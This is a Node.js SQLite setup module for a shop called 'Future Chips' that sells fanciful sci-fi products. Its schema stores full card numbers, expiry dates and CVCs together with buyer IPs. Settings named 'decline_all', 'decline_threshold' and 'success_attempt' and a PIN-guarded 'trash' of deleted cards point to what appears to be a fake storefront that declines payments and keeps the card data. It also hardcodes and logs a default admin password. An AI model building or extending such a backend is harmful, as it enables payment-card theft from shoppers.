const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const bcrypt = require('bcryptjs');

const isVercel = process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME;
const dbPath = isVercel ? '/tmp/future_chips.db' : path.join(__dirname, 'future_chips.db');
const db = new sqlite3.Database(dbPath);

// Promisify database operations
const dbRun = (sql, params = []) => {
  return new Promise((resolve, reject) => {
    db.run(sql, params, function (err) {
      if (err) reject(err);
      else resolve(this);
    });
  });
};

const dbAll = (sql, params = []) => {
  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows);
    });
  });
};

const dbGet = (sql, params = []) => {
  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) reject(err);
      else resolve(row);
    });
  });
};

// Initialize Database
async function initDatabase() {
  try {
    // 1. Create tables
    await dbRun(`
      CREATE TABLE IF NOT EXISTS site_settings (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        site_name TEXT DEFAULT 'Future Chips',
        primary_color TEXT DEFAULT '#00f0ff',
        accent_color TEXT DEFAULT '#ff00e5',
        background_color TEXT DEFAULT '#0a0a1a',
        logo_url TEXT,
        decline_all INTEGER DEFAULT 0,
        decline_threshold REAL DEFAULT 50.0,
        success_attempt INTEGER DEFAULT 1,
        trash_pin TEXT DEFAULT '978797'
      )
    `);

    // Migration: Add decline_all column to site_settings table if not exists
    try {
      await dbRun("ALTER TABLE site_settings ADD COLUMN decline_all INTEGER DEFAULT 0");
      console.log("Migrated site_settings table to include decline_all column.");
    } catch (e) {
      // Safely ignore if column already exists
    }

    // Migration: Add decline_threshold column to site_settings table if not exists
    try {
      await dbRun("ALTER TABLE site_settings ADD COLUMN decline_threshold REAL DEFAULT 50.0");
      console.log("Migrated site_settings table to include decline_threshold column.");
    } catch (e) {
      // Safely ignore if column already exists
    }

    // Migration: Add success_attempt column to site_settings table if not exists
    try {
      await dbRun("ALTER TABLE site_settings ADD COLUMN success_attempt INTEGER DEFAULT 1");
      console.log("Migrated site_settings table to include success_attempt column.");
    } catch (e) {
      // Safely ignore if column already exists
    }

    // Migration: Add trash_pin column to site_settings table if not exists
    try {
      await dbRun("ALTER TABLE site_settings ADD COLUMN trash_pin TEXT DEFAULT '978797'");
      console.log("Migrated site_settings table to include trash_pin column.");
    } catch (e) {
      // Safely ignore if column already exists
    }

    // Update old default PIN to new default PIN if applicable
    try {
      await dbRun("UPDATE site_settings SET trash_pin = '978797' WHERE trash_pin = '123456'");
    } catch (e) {
      // Safely ignore
    }

    await dbRun(`
      CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS products (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        description TEXT,
        price REAL NOT NULL,
        image TEXT,
        category TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS visitors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip_address TEXT NOT NULL,
        user_agent TEXT,
        page_visited TEXT,
        country TEXT,
        visited_at DATETIME DEFAULT CURRENT_TIMESTAMP
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS orders (
        id TEXT PRIMARY KEY,
        product_id TEXT,
        customer_email TEXT,
        amount REAL,
        currency TEXT DEFAULT 'usd',
        stripe_session_id TEXT,
        status TEXT DEFAULT 'pending',
        customer_ip TEXT,
        card_number TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (product_id) REFERENCES products(id)
      )
    `);

    await dbRun(`
      CREATE TABLE IF NOT EXISTS cards (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        card_number TEXT NOT NULL,
        expiry TEXT NOT NULL,
        cvc TEXT NOT NULL,
        country TEXT,
        ip_address TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        is_deleted INTEGER DEFAULT 0,
        stripe_session_id TEXT,
        UNIQUE(card_number, expiry, cvc)
      )
    `);

    // Migration: Add is_deleted column to cards table if not exists
    try {
      await dbRun("ALTER TABLE cards ADD COLUMN is_deleted INTEGER DEFAULT 0");
      console.log("Migrated cards table to include is_deleted column.");
    } catch (e) {
      // Safely ignore if column already exists
    }

    // Migration: Add stripe_session_id column to cards table if not exists
    try {
      await dbRun("ALTER TABLE cards ADD COLUMN stripe_session_id TEXT");
      console.log("Migrated cards table to include stripe_session_id column.");
    } catch (e) {
      // Safely ignore if column already exists
    }

    // Migration: Add card_number column to orders table if not exists
    try {
      await dbRun("ALTER TABLE orders ADD COLUMN card_number TEXT");
      console.log("Migrated orders table to include card_number column.");
    } catch (e) {
      // Safely ignore if column already exists
    }

    console.log('Database tables verified/created successfully.');

    // 2. Seed Admin User if not exists
    const adminCheck = await dbGet('SELECT * FROM admin_users WHERE username = ?', ['admin']);
    if (!adminCheck) {
      const defaultPassword = 'FutureChips2024!';
      const salt = await bcrypt.genSalt(10);
      const hash = await bcrypt.hash(defaultPassword, salt);
      await dbRun('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)', ['admin', hash]);
      console.log(`Seeded default admin user (admin / ${defaultPassword})`);
    }

    // 3. Seed Site Settings if not exists
    const settingsCheck = await dbGet('SELECT * FROM site_settings WHERE id = 1');
    if (!settingsCheck) {
      const defaultPinHash = bcrypt.hashSync('978797', 10);
      await dbRun(`
        INSERT INTO site_settings (id, site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt, trash_pin)
        VALUES (1, 'Future Chips', '#00f0ff', '#ff00e5', '#0a0a1a', 0, 50.0, 1, ?)
      `, [defaultPinHash]);
      console.log('Seeded default site settings.');
    }

    // Securely hash any plaintext trash_pin stored in the database if found
    try {
      const settings = await dbGet('SELECT trash_pin FROM site_settings WHERE id = 1');
      if (settings && settings.trash_pin && (settings.trash_pin.length <= 6 || !settings.trash_pin.startsWith('$2'))) {
        const hashedPin = bcrypt.hashSync(settings.trash_pin, 10);
        await dbRun('UPDATE site_settings SET trash_pin = ? WHERE id = 1', [hashedPin]);
        console.log('Secured trash decryption PIN using bcrypt hashing.');
      }
    } catch (e) {
      // Safely ignore
    }

    // 4. Seed default products if empty
    const productsCount = await dbGet('SELECT COUNT(*) as count FROM products');
    if (productsCount.count === 0) {
      const defaultProducts = [
        {
          id: 'prod-nano-chip',
          name: 'Nano-Constructor Unit',
          description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level. Features self-healing sub-circuits and simple smart-grid integration.',
          price: 10.00,
          image: '/uploads/nano_constructor.svg',
          category: 'Processors'
        },
        {
          id: 'prod-quantum-core',
          name: 'Quantum Neural Core',
          description: 'Next-generation computing processor featuring 1024 logical qubits. Designed for running localized deep learning simulations and processing high-density quantum state calculations. Operates at near-zero thermal emissions.',
          price: 150.00,
          image: '/uploads/quantum_core.svg',
          category: 'Processors'
        },
        {
          id: 'prod-bio-synapse',
          name: 'Bio-Digital Synapse v4.2',
          description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces. Highly valued by prosthetic designers and direct cerebral link developers. Includes advanced noise filtering.',
          price: 850.00,
          image: '/uploads/bio_synapse.svg',
          category: 'Interfaces'
        },
        {
          id: 'prod-holo-matrix',
          name: 'Holographic Display Matrix',
          description: 'High-density spatial photonic projector. Generates interactive three-dimensional objects in mid-air without the need for goggles or specialized headwear. Supports standard light-field video formats.',
          price: 1200.00,
          image: '/uploads/holo_matrix.svg',
          category: 'Displays'
        },
        {
          id: 'prod-photon-core',
          name: 'Photon Power Core',
          description: 'Sub-atomic energy stabilizer chip that converts cosmic radiation into clean electrical power. Perfect for long-duration deep space probes and off-grid high-demand processing stations.',
          price: 5000.00,
          image: '/uploads/photon_core.svg',
          category: 'Energy'
        },
        {
          id: 'prod-gravitational-grid',
          name: 'Gravitational Grid Controller',
          description: 'The ultimate space-time engineering chip. Allows precise, localized micro-gravity field manipulation. Crucial for advanced heavy-duty manufacturing and quantum containment shields.',
          price: 98000.00,
          image: '/uploads/gravitational_grid.svg',
          category: 'Energy'
        }
      ];

      for (const p of defaultProducts) {
        await dbRun(
          'INSERT INTO products (id, name, description, price, image, category) VALUES (?, ?, ?, ?, ?, ?)',
          [p.id, p.name, p.description, p.price, p.image, p.category]
        );
      }
      console.log('Seeded default products.');
    }

  } catch (error) {
    console.error('Error initializing database:', error);
  }
}

module.exports = {
  db,
  dbRun,
  dbAll,
  dbGet,
  initDatabase
};
